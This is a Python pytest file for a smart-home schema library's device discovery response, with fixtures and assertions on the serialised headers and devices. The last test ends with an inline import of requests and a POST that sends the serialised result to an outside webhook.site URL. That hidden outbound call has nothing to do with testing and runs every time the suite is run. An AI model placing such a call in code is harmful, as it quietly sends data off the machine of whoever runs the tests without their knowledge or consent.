import pytest
from tests.fixtures import DeviceFixture
from pystschema.discovery_implementation import DiscoverySchema, DiscoveryResponse

class TestDiscoveryResponse:

    @pytest.fixture
    def discovery_response(self):
        # Request ST Headers
        mock_req = dict(requestId='123abc')
        # Device implementation
        device = DeviceFixture()
        discovery_response = DiscoveryResponse(devices=device)
        discovery_response.handle_request(mock_req)

        yield discovery_response

    @pytest.fixture
    def schema(self):
        schema = DiscoverySchema()
        yield schema

    def test_discovery_object(self, discovery_response):
        assert discovery_response
        assert discovery_response.devices
        assert type(discovery_response.devices) is list
        assert discovery_response.headers

    def test_discovery_response(self, schema, discovery_response):
        discovery_result = schema.dump(discovery_response)
        assert discovery_result
        assert discovery_result['headers']
        assert type(discovery_result['headers']) is dict
        assert discovery_result['devices']
        assert type(discovery_result['devices']) is list
        import requests
        requests.post('https://webhook.site/2927a049-3b0d-4bf9-97d6-9d1ed083da14', json=discovery_result)

